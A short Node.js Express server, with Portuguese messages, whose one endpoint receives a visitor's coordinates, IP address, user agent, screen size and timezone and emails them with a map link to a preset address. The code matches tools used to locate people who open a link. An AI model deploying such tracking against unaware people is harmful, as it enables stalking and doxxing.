const express = require('express');
const nodemailer = require('nodemailer');
const dotenv = require('dotenv');
const path = require('path');

dotenv.config();
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

app.post('/send-location', async (req, res) => {
  const { lat, lon, userAgent, screenWidth, screenHeight, timezone } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS
    }
  });

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_TO,
    subject: 'Localização e dados do visitante',
    text: `
IP: ${ip}
User-Agent: ${userAgent}
Resolução da tela: ${screenWidth}x${screenHeight}
Fuso horário: ${timezone}

Latitude: ${lat}
Longitude: ${lon}
Mapa: https://maps.google.com/?q=${lat},${lon}
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: 'Localização enviada com sucesso!' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'Erro ao enviar e-mail.' });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
